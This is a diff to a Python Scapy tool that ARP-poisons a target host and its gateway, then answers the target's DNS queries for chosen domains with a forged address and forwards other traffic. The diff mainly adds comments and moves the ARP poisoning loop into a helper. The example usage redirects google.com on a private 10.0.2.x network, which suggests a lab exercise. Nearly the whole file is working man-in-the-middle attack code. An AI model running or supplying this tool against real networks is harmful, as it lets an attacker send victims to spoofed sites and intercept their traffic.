@@ -1,7 +1,6 @@
 from scapy.all import *
 from arp_spoofing import * 
 
-
 dns_server_ip = ""
 dns_server_mac = ""
 spoofed_addr = ""
@@ -11,7 +10,7 @@ sock = 0
 host_ip_addr = ""
 host_mac_addr = ""
 
-
+# Get the gateway IP and MAC address
 def get_gateway():
     gws=conf.route.route("0.0.0.0")[2]
 
@@ -22,7 +21,7 @@ def get_gateway():
 
     print("Gateway: " +  dns_server_ip + " " + dns_server_mac)
 
-
+# Spoof a DNS response for a given packet
 def dns_spoof(pkt, ip_of_dns):
     spoofed_pkt=pkt.copy()
     qname=pkt[DNSQR].qname
@@ -46,7 +45,7 @@ def dns_spoof(pkt, ip_of_dns):
 
     sock.send(spoofed_pkt)
 
-
+# Forward the packet
 def fwd_pkt(pkt):
     pkt[Ether].dst=dns_server_mac
 
@@ -60,27 +59,19 @@ def fwd_pkt(pkt):
 
     sock.send(pkt)
 
-
+# Decide what to do with the packet
+# If it is a DNS request for a spoofed domain, send a spoofed response
+# otherwise forward it to the DNS server
 def dns_pkt_check(pkt):
     if pkt.haslayer(DNS) and spoofed_dom.has_key(pkt[DNSQR].qname):
         dns_spoof(pkt, spoofed_addr)
     else:
         fwd_pkt(pkt)
 
-
-def arp_for_dns_spoof_loop(ip, mac, spoofed_ip):
-    print("[*] Spoofing %s (MAC: %s ) as %s ..." % (ip, mac, spoofed_ip))
-    i = 0
-    while i in range(10):
-        arp_spoof(ip, mac, spoofed_ip)
-        time.sleep(1)
-        i+=1
-    print("ARP Poison to %s complete" % ip)
-
-
+# Start the DNS poisoning process
 def start_dns_spoofing(cmd):
     args = shlex.split(cmd)
-    tgtip = spoofed_addr = dom = None
+    tgtip = dom = None
     for i, arg in enumerate(args):
         if arg == "-iface" and i + 1 < len(args):
             global iface
@@ -108,19 +99,12 @@ def start_dns_spoofing(cmd):
 
     get_gateway()
 
-    arp_thread_gws = threading.Thread(target=arp_for_dns_spoof_loop, args=(dns_server_ip, host_mac_addr, tgtip))
-    arp_thread_gws.daemon = True
-    arp_thread_gws.start()
-
-    arp_thread_tgt = threading.Thread(target=arp_for_dns_spoof_loop, args=(tgtip, host_mac_addr, dns_server_ip))
-    arp_thread_tgt.daemon = True
-    arp_thread_tgt.start()
+    start_arp_thread(dns_server_ip, host_mac_addr, tgtip, 10)
+    start_arp_thread(tgtip, host_mac_addr, dns_server_ip, 10)
 
     sniff(store = 0, filter="src host " + str(tgtip), iface = iface, prn = lambda x: dns_pkt_check(x))
 
-
-#dnspoison -iface enp0s9 -tgtip 10.0.2.4 -dom google.com -spaddr 10.0.2.5 
-
-
+# Example usage:
+# dnspoison -iface enp0s9 -tgtip 10.0.2.4 -dom google.com -spaddr 10.0.2.5 
 
 
